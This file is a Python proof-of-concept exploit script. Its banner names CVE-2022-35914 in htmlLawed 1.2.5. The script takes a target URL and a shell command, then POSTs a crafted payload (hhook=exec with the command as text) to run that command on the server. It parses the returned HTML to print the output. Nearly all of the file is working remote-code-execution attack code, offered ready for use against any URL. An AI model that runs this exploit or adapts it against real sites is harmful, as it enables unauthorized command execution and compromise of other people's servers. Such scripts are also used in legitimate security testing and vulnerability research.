import re
import os
import argparse
import requests

from typing import Dict, Optional, Union

class Exploit:
    """
    A class to create and send HTTP requests to a target URL.
    
    Attributes:
        target_url (str): The URL to which the request will be sent.
        request_headers (Optional[Dict[str, str]]): The headers to include in the request.
        request_data (Optional[Union[Dict[str, Union[str, int]], str]]): The data to include in the request.
        request_type (Optional[str]): The type of HTTP request (e.g., 'GET', 'POST').
    """
    
    def __init__(self, url: str, headers: Optional[Dict[str, str]] = None, data: Optional[Union[Dict[str, Union[str, int]], str]] = None, req_type: Optional[str] = None) -> None:
        """
        Constructs the necessary attributes for the Exploit object.
        
        Args:
            url (str): The target URL.
            headers (Optional[Dict[str, str]]): The request headers. Defaults to None.
            data (Optional[Union[Dict[str, Union[str, int]], str]]): The request data. Defaults to None.
            req_type (Optional[str]): The type of HTTP request. Defaults to None.
        """
        self.target_url = url
        self.request_headers = headers
        self.request_data = data
        self.request_type = req_type
        
    def send_request(self) -> str:
        """
        Sends an HTTP request to the target URL based on the specified request type.
        
        Returns:
            str: The response text or an error message if the request fails.
        """
        if self.request_type is None:
            return "Request type not specified"
        
        try:
            match self.request_type.upper():
                case 'POST':
                    response = requests.post(self.target_url, headers=self.request_headers, data=self.request_data)
                case 'GET':
                    response = requests.get(self.target_url, headers=self.request_headers, params=self.request_data)
                case 'PUT':
                    response = requests.put(self.target_url, headers=self.request_headers, data=self.request_data)
                case 'DELETE':
                    response = requests.delete(self.target_url, headers=self.request_headers, data=self.request_data)
                case _:
                    return "Unsupported request type"
            
            response.raise_for_status()
            return response.text
        except requests.exceptions.HTTPError as e:
            return f"HTTP error occurred: {e}"
        except requests.exceptions.ConnectionError:
            return "Failed to connect to the server. The domain might be down or doesn't exist."
        except requests.exceptions.Timeout:
            return "The request timed out."
        except requests.exceptions.RequestException as e:
            return f"An error occurred: {e}"


def clear_screen() -> None:
    """
    Clears the terminal screen based on the operating system.
    """
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def print_banner() -> None:
    """
    Prints the banner.
    """
    banner = """
#############################################
#                                           #
#          Exploit Script Utility           #
#                                           #
#############################################
#                                           #
#    Author: oromos    Date: 29.05.2024     #
#                                           #
# This script is a POC for CVE-2022-35914   #
# on htmlLawed 1.2.5 to get Remote Code     #
# Execution on the target website           #
#                                           #
# Impact:                                   #
# Remote Code Execution.                    #
#                                           #
# Usage:                                    #
# python3 exploit.py -u <url> -c <command>  #
#                                           #
#############################################
    """
    print(banner)

def parse_arguments():
    """
    Parses command line arguments.
    
    Returns:
        Namespace: The parsed arguments.
    """
    parser = argparse.ArgumentParser(description="Exploit script")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-c", "--cmd", required=True, help="Command to execute")
    return parser.parse_args()

def worker() -> None:
    """
    Demonstrates the usage of the Exploit class.
    """
    args = parse_arguments()
    
    if not args.url or not args.cmd:
        print_banner()
        print("\n[i] Usage: script.py -u <URL> -c <CMD>\n")
        return
    
    clear_screen()
    print_banner()
    print("\n[+] Command output:")
    
    exploit = Exploit(
        url=args.url,
        data={'sid': 'foo', 'hhook': 'exec', 'text': args.cmd},
        req_type='POST'
    )
    
    response = exploit.send_request()
    
    if response:
        matches = re.findall(r'&nbsp; \[[0-9]+\] => (.*)<br />', response)
        for match in matches:
            print(match)

if __name__ == "__main__":
    worker()
